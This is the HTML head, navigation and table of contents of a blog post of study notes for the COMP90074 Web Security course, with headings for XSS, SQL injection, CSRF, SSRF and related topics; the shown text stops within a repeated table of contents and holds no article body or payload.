@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="COMP90074 Web Security 网络安全 基础 OWASP Top 10 web vulnerabilities (2017)  Injection Broken Authentication Sensitive Data Exposure XML External Entities (XEE) Broken Access Control Security Misconfigurat">
+<meta property="og:type" content="article">
+<meta property="og:title" content="COMP90074 网络安全">
+<meta property="og:url" content="https://yumtaro.com/archives/0.html/index.html">
+<meta property="og:site_name" content="ZDZ">
+<meta property="og:description" content="COMP90074 Web Security 网络安全 基础 OWASP Top 10 web vulnerabilities (2017)  Injection Broken Authentication Sensitive Data Exposure XML External Entities (XEE) Broken Access Control Security Misconfigurat">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/ZhidongZhou/gallery/master/img/iShot2022-03-03 15.18.01.png">
+<meta property="article:published_time" content="2022-04-22T11:46:00.000Z">
+<meta property="article:modified_time" content="2022-04-22T11:47:59.981Z">
+<meta property="article:author" content="Darren Z">
+<meta property="article:tag" content="unimelb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ZhidongZhou/gallery/master/img/iShot2022-03-03 15.18.01.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>COMP90074 网络安全</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/css/zdz.css" media="screen" type="text/css">
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="ZDZ" type="application/atom+xml">
+</head>
+
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">🔍</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/archives/99feb3ce.html/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yumtaro.com/archives/0.html/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yumtaro.com/archives/0.html/&text=COMP90074 网络安全"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yumtaro.com/archives/0.html/&title=COMP90074 网络安全"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yumtaro.com/archives/0.html/&is_video=false&description=COMP90074 网络安全"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=COMP90074 网络安全&body=Check out this article: https://yumtaro.com/archives/0.html/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yumtaro.com/archives/0.html/&title=COMP90074 网络安全"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 网络安全"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 网络安全"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 网络安全"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yumtaro.com/archives/0.html/&name=COMP90074 网络安全&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yumtaro.com/archives/0.html/&t=COMP90074 网络安全"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#comp90074-web-security-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">COMP90074 Web Security
+网络安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#owasp-top-10-web-vulnerabilities-2017"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">OWASP Top 10 web
+vulnerabilities (2017)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#terminology"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">Terminology</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#permission-%E6%9D%83%E9%99%90"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">Permission 权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#html-events"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">HTML Events</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-cookies-%E4%BF%A1%E6%81%AF%E8%AE%B0%E5%BD%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">HTTP Cookies 信息记录程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#domain-name-service-dns-%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">Domain Name Service (DNS)
+域名服务系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#asynchronous%E5%BC%82%E6%AD%A5-javascript-and-xml-ajax"><span class="toc-number">1.1.0.7.</span> <span class="toc-text">Asynchronous异步
+JavaScript And XML (AJAX)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#document-object-model-dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.1.0.8.</span> <span class="toc-text">Document Object Model
+(DOM) 文档对象模型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-vs-csrf-vs-ssrf"><span class="toc-number">1.2.</span> <span class="toc-text">XSS vs CSRF vs SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#timing-attacks"><span class="toc-number">1.3.</span> <span class="toc-text">Timing Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit"><span class="toc-number">1.3.0.0.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-number">1.4.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#impact"><span class="toc-number">1.4.0.0.0.1.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation"><span class="toc-number">1.4.0.0.0.2.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stored-xss"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Stored XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-1"><span class="toc-number">1.4.0.1.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dom-based-xss"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">DOM-Based XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-2"><span class="toc-number">1.4.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-parameter-pollution-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">HTTP Parameter Pollution
+参数污染</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.4.0.3.0.1.</span> <span class="toc-text">定义</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tabnapping-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%88%86%E9%A1%B5%E7%BB%91%E6%9E%B6"><span class="toc-number">1.4.0.4.</span> <span class="toc-text">Tabnapping 浏览器分页绑架</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-1"><span class="toc-number">1.4.0.4.0.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-3"><span class="toc-number">1.4.0.4.0.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#impact-1"><span class="toc-number">1.4.0.4.0.3.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation-1"><span class="toc-number">1.4.0.4.0.4.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clickjacking-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="toc-number">1.4.0.5.</span> <span class="toc-text">Clickjacking 点击劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#impact-2"><span class="toc-number">1.4.0.5.0.1.</span> <span class="toc-text">Impact</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subdomain-takeovers"><span class="toc-number">1.4.0.6.</span> <span class="toc-text">Subdomain Takeovers</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli"><span class="toc-number">1.5.</span> <span class="toc-text">SQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E4%B8%A4%E7%A7%8Dcomment"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">SQL两种Comment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-injection-union-attacks"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">SQL
+injection UNION attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#get-database-version"><span class="toc-number">1.5.0.2.0.1.</span> <span class="toc-text">Get Database Version</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-schema-name"><span class="toc-number">1.5.0.2.0.2.</span> <span class="toc-text">GET Schema Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-table-name"><span class="toc-number">1.5.0.2.0.3.</span> <span class="toc-text">Get Table Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-string-value"><span class="toc-number">1.5.0.2.0.4.</span> <span class="toc-text">Get String Value</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#retrieve-multiple-values-in-a-single-column"><span class="toc-number">1.5.0.2.0.5.</span> <span class="toc-text">Retrieve Multiple
+Values in a Single Column</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#authentication-bypass-with-limit"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">Authentication Bypass with
+LIMIT</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-4"><span class="toc-number">1.5.0.3.0.1.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation"><span class="toc-number">1.5.0.3.0.2.</span> <span class="toc-text">Mitigation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-wildcard-attack"><span class="toc-number">1.5.0.4.</span> <span class="toc-text">SQL Wildcard Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-5"><span class="toc-number">1.5.0.4.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cross-site-request-forgery-%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-csrf"><span class="toc-number">1.6.</span> <span class="toc-text">Cross-Site
+Request Forgery 跨站点请求伪造 (CSRF)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation-1"><span class="toc-number">1.6.0.0.0.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-6"><span class="toc-number">1.6.0.0.0.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#server-side-request-forgery-ssrf-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">1.7.</span> <span class="toc-text">Server-Side
+Request Forgery (SSRF) 服务器端请求伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data-exfiltration-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">Data Exfiltration 数据泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-2"><span class="toc-number">1.7.0.1.0.1.</span> <span class="toc-text">定义</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%B3%84%E6%BC%8F%E7%9A%84dynamic-url-parameter%E5%8F%91%E8%B5%B7%E4%BC%AA%E9%80%A0%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82"><span class="toc-number">1.7.0.2.</span> <span class="toc-text">根据泄漏的Dynamic
+URL &amp; Parameter发起伪造服务端请求</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-7"><span class="toc-number">1.7.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#remote-code-execution-rce-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.7.0.3.</span> <span class="toc-text">Remote Code
+Execution (RCE) 远程执行代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#authorisation-vs-authentication"><span class="toc-number">1.8.</span> <span class="toc-text">Authorisation vs
+Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialisation-vs-deserialisation"><span class="toc-number">1.9.</span> <span class="toc-text">Serialisation vs
+Deserialisation</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        COMP90074 网络安全
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZDZ</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-22T11:46:00.000Z" itemprop="datePublished">22-04-2022</time>
+        
+      
+    </div>
+
+
+      <!-- 访问计算 -->
+      
+    <div class="article-tag">
+        <span id="/archives/0.html/" class="leancloud_visitors" data-flag-title="COMP90074 网络安全">                    
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+            </span>
+            
+            <span class="post-meta-item-text">Hits</span>
+            <span class="leancloud-visitors-count"></span>
+        </span>
+    </div>
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a> › <a class="category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/">unimelb</a> › <a class="category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/MIT/">MIT</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/unimelb/" rel="tag">unimelb</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <!-- 必须显示toc -->
+    <hr>
+    <!-- <div id='toc'><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#comp90074-web-security-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">COMP90074 Web Security
+网络安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#owasp-top-10-web-vulnerabilities-2017"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">OWASP Top 10 web
+vulnerabilities (2017)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#terminology"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">Terminology</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#permission-%E6%9D%83%E9%99%90"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">Permission 权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#html-events"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">HTML Events</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-cookies-%E4%BF%A1%E6%81%AF%E8%AE%B0%E5%BD%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">HTTP Cookies 信息记录程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#domain-name-service-dns-%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">Domain Name Service (DNS)
+域名服务系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#asynchronous%E5%BC%82%E6%AD%A5-javascript-and-xml-ajax"><span class="toc-number">1.1.0.7.</span> <span class="toc-text">Asynchronous异步
+JavaScript And XML (AJAX)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#document-object-model-dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.1.0.8.</span> <span class="toc-text">Document Object Model
+(DOM) 文档对象模型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-vs-csrf-vs-ssrf"><span class="toc-number">1.2.</span> <span class="toc-text">XSS vs CSRF vs SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#timing-attacks"><span class="toc-number">1.3.</span> <span class="toc-text">Timing Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit"><span class="toc-number">1.3.0.0.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-number">1.4.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#impact"><span class="toc-number">1.4.0.0.0.1.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation"><span class="toc-number">1.4.0.0.0.2.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stored-xss"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Stored XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-1"><span class="toc-number">1.4.0.1.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dom-based-xss"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">DOM-Based XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-2"><span class="toc-number">1.4.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-parameter-pollution-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">HTTP Parameter Pollution
+参数污染</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.4.0.3.0.1.</span> <span class="toc-text">定义</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tabnapping-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%88%86%E9%A1%B5%E7%BB%91%E6%9E%B6"><span class="toc-number">1.4.0.4.</span> <span class="toc-text">Tabnapping 浏览器分页绑架</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-1"><span class="toc-number">1.4.0.4.0.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-3"><span class="toc-number">1.4.0.4.0.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#impact-1"><span class="toc-number">1.4.0.4.0.3.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation-1"><span class="toc-number">1.4.0.4.0.4.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clickjacking-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="toc-number">1.4.0.5.</span> <span class="toc-text">Clickjacking 点击劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#impact-2"><span class="toc-number">1.4.0.5.0.1.</span> <span class="toc-text">Impact</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subdomain-takeovers"><span class="toc-number">1.4.0.6.</span> <span class="toc-text">Subdomain Takeovers</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli"><span class="toc-number">1.5.</span> <span class="toc-text">SQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E4%B8%A4%E7%A7%8Dcomment"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">SQL两种Comment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-injection-union-attacks"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">SQL
+injection UNION attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#get-database-version"><span class="toc-number">1.5.0.2.0.1.</span> <span class="toc-text">Get Database Version</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-schema-name"><span class="toc-number">1.5.0.2.0.2.</span> <span class="toc-text">GET Schema Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-table-name"><span class="toc-number">1.5.0.2.0.3.</span> <span class="toc-text">Get Table Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-string-value"><span class="toc-number">1.5.0.2.0.4.</span> <span class="toc-text">Get String Value</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#retrieve-multiple-values-in-a-single-column"><span class="toc-number">1.5.0.2.0.5.</span> <span class="toc-text">Retrieve Multiple
+Values in a Single Column</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#authentication-bypass-with-limit"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">Authentication Bypass with
+LIMIT</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-4"><span class="toc-number">1.5.0.3.0.1.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation"><span class="toc-number">1.5.0.3.0.2.</span> <span class="toc-text">Mitigation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-wildcard-attack"><span class="toc-number">1.5.0.4.</span> <span class="toc-text">SQL Wildcard Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-5"><span class="toc-number">1.5.0.4.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cross-site-request-forgery-%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-csrf"><span class="toc-number">1.6.</span> <span class="toc-text">Cross-Site
+Request Forgery 跨站点请求伪造 (CSRF)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation-1"><span class="toc-number">1.6.0.0.0.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-6"><span class="toc-number">1.6.0.0.0.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#server-side-request-forgery-ssrf-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">1.7.</span> <span class="toc-text">Server-Side
+Request Forgery (SSRF) 服务器端请求伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data-exfiltration-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">Data Exfiltration 数据泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-2"><span class="toc-number">1.7.0.1.0.1.</span> <span class="toc-text">定义</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%B3%84%E6%BC%8F%E7%9A%84dynamic-url-parameter%E5%8F%91%E8%B5%B7%E4%BC%AA%E9%80%A0%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82"><span class="toc-number">1.7.0.2.</span> <span class="toc-text">根据泄漏的Dynamic
+URL &amp; Parameter发起伪造服务端请求</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-7"><span class="toc-number">1.7.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#remote-code-execution-rce-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.7.0.3.</span> <span class="toc-text">Remote Code
